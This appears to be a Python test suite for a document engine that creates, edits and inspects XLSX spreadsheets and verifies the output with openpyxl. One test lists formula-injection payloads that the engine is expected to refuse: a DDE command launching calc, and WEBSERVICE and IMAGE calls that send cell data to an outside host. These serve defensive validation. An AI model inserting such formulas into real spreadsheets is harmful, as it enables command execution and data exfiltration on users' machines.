"""XLSX create/edit/read through the engine, reopened with openpyxl."""
import datetime
import io
import zipfile

import openpyxl

import builders
from harness import EngineCase


def reopen(data, **kwargs):
    return openpyxl.load_workbook(io.BytesIO(data), **kwargs)


class XlsxCreateTests(EngineCase):
    def test_formula_caches_are_explicitly_unverified(self):
        stage = self.stage()
        receipt = self.ok(stage, 'document_write', 'create', {'format': 'xlsx', 'sheets': [
            {'rows': [[2, {'value': '=A1*3', 'type': 'formula'}]]}]}, output='formula.xlsx')
        calculation = receipt['qa']['calculation']
        self.assertEqual(calculation['status'], 'unverified')
        self.assertEqual(calculation['formula_cells'], 1)
        self.assertEqual(calculation['missing_values'], 1)
        stage.inputs = []
        stage.add('formula.xlsx', stage.read('out/formula.xlsx'))
        inspection = self.ok(stage, 'document_read', 'inspect')['result']
        self.assertEqual(inspection['calculation'], calculation)

    def test_recalculation_report_counts_cached_results_and_errors(self):
        import xlsxwriter
        buffer = io.BytesIO()
        book = xlsxwriter.Workbook(buffer, {'in_memory': True})
        sheet = book.add_worksheet()
        sheet.write_formula('A1', '=2*3', None, 6)
        sheet.write_formula('A2', '=1/0', None, '#DIV/0!')
        sheet.write_formula('A3', '=IF(1=1,"","x")', None, '')
        book.close()
        # xlsxwriter emits an untyped empty <v/> for this case. Mark the fixture
        # as an actual cached string; an untyped empty value is ambiguous.
        with zipfile.ZipFile(io.BytesIO(buffer.getvalue())) as source:
            patched = io.BytesIO()
            with zipfile.ZipFile(patched, 'w', zipfile.ZIP_DEFLATED) as target:
                for item in source.infolist():
                    content = source.read(item)
                    if item.filename == 'xl/worksheets/sheet1.xml':
                        content = content.replace(b'<c r="A3">', b'<c r="A3" t="str">')
                    target.writestr(item, content)
        content = patched.getvalue()
        stage = self.stage()
        stage.add('original.xlsx', content)
        self.ok(stage, 'document_write', 'convert', {'recalculate': True},
            phase='recalculate_prepare', output='calculated.xlsx')
        stage.write('work/office-out/calculated.xlsx', content)
        receipt = self.ok(stage, 'document_write', 'convert', {'recalculate': True},
            phase='office_finalize', output='calculated.xlsx', options={'converted': 'work/office-out/calculated.xlsx'})
        self.assertEqual(receipt['qa']['calculation'], {'status': 'errors', 'engine': 'libreoffice',
            'formula_cells': 3, 'missing_values': 0, 'error_values': 1, 'input_caches_cleared': 3})
        self.assertTrue(any('missing or error formula values' in d['message'] for d in receipt['diagnostics']))

    def test_typed_cells_styles_and_charts(self):
        stage = self.stage()
        result = self.ok(stage, 'document_write', 'create', {
            'format': 'xlsx', 'properties': {'title': 'Umsatz', 'author': 'Ada'},
            'sheets': [{
                'name': 'Sales', 'header': True, 'freeze': 'A2', 'autofilter': True,
                'rows': [['Region', 'Q1', 'Q2', 'Total', 'Note'],
                         ['Nord', 120, 98.5, {'value': '=SUM(B2:C2)', 'type': 'formula'}, '=NOT A FORMULA'],
                         ['Süd', 80, 75, {'value': '=SUM(B3:C3)', 'type': 'formula'}, '+49 123'],
                         ['Datum', {'value': '2026-10-18', 'type': 'date'}, {'value': 0.25, 'type': 'percent'},
                          {'value': '2026-10-18T14:30', 'type': 'datetime'}, True]],
                'number_formats': {'B': '#,##0.00'},
                'widths': {'A': 18},
                'styles': [{'range': 'A1:E1', 'fill': 'FFF2CC', 'align': 'center'}],
                'merge': ['A6:C6'],
                'cells': [{'cell': 'A6', 'value': 'Merged', 'bold': True}],
                'table': {'name': 'SalesTable', 'range': 'A1:E3'},
                'charts': [{'type': 'column', 'data': 'B1:C3', 'categories': 'A2:A3', 'title': 'Umsatz',
                            'anchor': 'G2'},
                           {'type': 'scatter', 'data': 'C2:C3', 'categories': 'B2:B3'}]},
                {'name': 'Second', 'rows': [['x', 1]]}]}, output='s.xlsx')['result']
        self.assertEqual(result, {'sheets': 2, 'cells': 23, 'format': 'xlsx', 'bytes': result['bytes']})
        data = stage.read('out/s.xlsx')
        book = reopen(data)
        sheet = book['Sales']
        self.assertEqual(sheet['D2'].value, '=SUM(B2:C2)')
        self.assertEqual(sheet['D2'].data_type, 'f')
        self.assertEqual(sheet['E2'].value, '=NOT A FORMULA')
        self.assertEqual(sheet['E2'].data_type, 's')
        self.assertEqual(sheet['B2'].number_format, '#,##0.00')
        self.assertEqual(sheet['B4'].value, datetime.datetime(2026, 10, 18))
        self.assertEqual(sheet['B4'].number_format, 'yyyy-mm-dd')
        self.assertEqual(sheet['C4'].number_format, '0%')
        self.assertIs(sheet['E4'].value, True)
        self.assertTrue(sheet['A1'].font.bold)
        self.assertEqual(sheet['A1'].fill.fgColor.rgb, 'FFFFF2CC')
        self.assertEqual(sheet.freeze_panes, 'A2')
        self.assertEqual(sheet.auto_filter.ref, 'A1:E6')
        self.assertIn('A6:C6', [str(r) for r in sheet.merged_cells.ranges])
        self.assertEqual(sheet.column_dimensions['A'].width, 18)
        self.assertIn('SalesTable', sheet.tables)
        self.assertEqual(book.properties.title, 'Umsatz')
        self.assertEqual(book.properties.creator, 'Ada')
        with zipfile.ZipFile(io.BytesIO(data)) as archive:
            charts = [name for name in archive.namelist() if name.startswith('xl/charts/chart')]
        self.assertEqual(len(charts), 2)

    def test_refused_formulas(self):
        stage = self.stage()
        for formula in ('=WEBSERVICE("http://x/?"&A1)', "=cmd|' /c calc'!A0", "='C:\\x\\[book.xlsx]S'!A1",
                        '=[other.xlsx]Sheet1!A1', '=IMAGE("http://x")', 'SUM(A1)'):
            receipt = self.failed(stage, 'invalid_spec', 'document_write', 'create', {
                'format': 'xlsx', 'sheets': [{'rows': [[{'value': formula, 'type': 'formula'}]]}]}, output='f.xlsx')
            self.assertEqual(receipt['error']['path'], 'spec.sheets[0].rows[0][0].value', formula)
        self.ok(stage, 'document_write', 'create', {
            'format': 'xlsx', 'sheets': [{'rows': [[{'value': '=IF(A2="a|b",1,0)', 'type': 'formula'}]]}]},
            output='ok.xlsx')

    def test_sheet_name_rules(self):
        stage = self.stage()
        self.failed(stage, 'invalid_spec', 'document_write', 'create', {
            'format': 'xlsx', 'sheets': [{'name': 'a/b'}]}, output='x.xlsx')
        self.failed(stage, 'invalid_spec', 'document_write', 'create', {
            'format': 'xlsx', 'sheets': [{'name': 'A'}, {'name': 'a'}]}, output='x.xlsx')


class XlsxEditTests(EngineCase):
    def setUp(self):
        self.st = self.stage()
        self.st.add('data.xlsx', builders.sample_xlsx())
        self.inspected = self.ok(self.st, 'document_read', 'inspect', options={'sheet': 'Data', 'limit': 100})['result']

    def edit(self, patches, output='e.xlsx'):
        receipt = self.ok(self.st, 'document_write', 'edit', {'source_sha256': self.inspected['source_sha256'],
                                                               'patches': patches}, output=output)
        return receipt, reopen(self.st.read('out/' + output))

    def test_inspect(self):
        items = {item['cell']: item for item in self.inspected['items']}
        self.assertEqual(items['D2']['type'], 'formula')
        self.assertIn('cached_value', items['D2'])
        self.assertEqual(items['B2']['value'], 3)
        self.assertEqual([s['name'] for s in self.inspected['sheets']], ['Data', 'Other'])
        self.failed(self.st, 'invalid_spec', 'document_read', 'inspect', options={'sheet': 'Missing'})

    def test_edit_ops(self):
        receipt, book = self.edit([
            {'sheet': 'Data', 'cell': 'B2', 'value': 10},
            {'op': 'set_cell', 'sheet': 'Data', 'cell': 'E2', 'value': '=B2*2'},
            {'op': 'set_cell', 'sheet': 'Data', 'cell': 'F2', 'value': '=B2*2', 'type': 'formula', 'bold': True},
            {'op': 'append_rows', 'sheet': 'Data', 'rows': [['Plum', 1, 0.2]]},
            {'op': 'add_sheet', 'name': 'Summary', 'position': 0, 'rows': [['Total', 1]], 'header': True},
            {'op': 'rename_sheet', 'sheet': 'Other', 'name': 'Misc'},
            {'op': 'style', 'sheet': 'Data', 'range': 'A1:C1', 'fill': 'D9E1F2', 'bold': True},
            {'op': 'number_formats', 'sheet': 'Data', 'number_formats': {'C': '0.00'}},
            {'op': 'freeze', 'sheet': 'Data', 'cell': 'A2'},
            {'op': 'widths', 'sheet': 'Data', 'widths': {'A': 25}},
            {'op': 'fill_placeholders', 'values': {'who': 'World'}},
            {'op': 'insert_rows', 'sheet': 'Misc', 'index': 1, 'count': 2},
            {'op': 'add_chart', 'sheet': 'Data', 'type': 'line', 'data': 'B1:B3', 'categories': 'A2:A3'}])
        self.assertEqual(receipt['result']['patches_applied'], 13)
        self.assertEqual(book.sheetnames, ['Summary', 'Data', 'Misc'])
        data = book['Data']
        self.assertEqual(data['B2'].value, 10)
        self.assertEqual(data['E2'].data_type, 's')
        self.assertEqual(data['F2'].data_type, 'f')
        self.assertTrue(data['F2'].font.bold)
        self.assertEqual(data['A7'].value, 'Plum')
        self.assertEqual(data['A6'].value, 'Hello World')
        self.assertEqual(data['C2'].number_format, '0.00')
        self.assertEqual(data.freeze_panes, 'A2')
        self.assertEqual(book['Misc']['A3'].value, 'x')
        self.assertEqual(receipt['qa']['calculation']['status'], 'unverified')

    def test_delete_last_sheet_refused(self):
        self.edit([{'op': 'delete_sheet', 'sheet': 'Other'}])
        self.failed(self.st, 'invalid_spec', 'document_write', 'edit', {
            'source_sha256': self.inspected['source_sha256'],
            'patches': [{'op': 'delete_sheet', 'sheet': 'Other'}, {'op': 'delete_sheet', 'sheet': 'Data'}]},
            output='x.xlsx')

    def test_text(self):
        text = self.ok(self.st, 'document_read', 'text')['result']['text']
        self.assertEqual(text.split('\n')[:4], ['## Sheet: Data', 'Name\tQty\tPrice', 'Apple\t3\t0.5', 'Pear\t5\t0.75'])
        self.assertIn('\n\nHello {{who}}', text)
        self.assertIn('## Sheet: Other\nx', text)

    def test_existing_chart_is_preserved(self):
        stage = self.stage()
        self.ok(stage, 'document_write', 'create', {'format': 'xlsx', 'sheets': [
            {'rows': [['a', 1], ['b', 2]], 'charts': [{'type': 'pie', 'data': 'B1:B2'}]}]}, output='c.xlsx')
        stage.inputs = []
        stage.add('c.xlsx', stage.read('out/c.xlsx'))
        sha = self.ok(stage, 'document_read', 'inspect')['result']['source_sha256']
        receipt = self.ok(stage, 'document_write', 'edit', {'source_sha256': sha, 'patches': [
            {'sheet': 'Sheet1', 'cell': 'A1', 'value': 'z'}]}, output='d.xlsx')
        self.assertGreater(receipt['qa']['roundtrip']['protected_parts_checked'], 0)
        self.assertEqual(len(reopen(stage.read('out/d.xlsx')).active._charts), 1)
